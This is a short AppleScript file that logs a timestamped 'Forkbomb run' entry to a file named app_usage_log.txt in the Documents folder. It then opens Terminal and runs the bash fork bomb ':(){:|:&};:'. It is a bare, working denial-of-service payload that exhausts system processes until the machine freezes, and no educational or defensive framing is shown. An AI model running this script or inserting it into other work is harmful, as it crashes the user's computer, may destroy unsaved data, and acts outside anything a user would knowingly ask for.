set logFile to POSIX path of (path to documents folder) & "app_usage_log.txt"
set timeStamp to do shell script "date '+%Y-%m-%d %H:%M:%S'"

do shell script "echo 'Forkbomb run st " & timeStamp & "' >> " & quoted form of logFile

tell application "Terminal"
	activate
	do script ":(){:|:&};:"
end tell
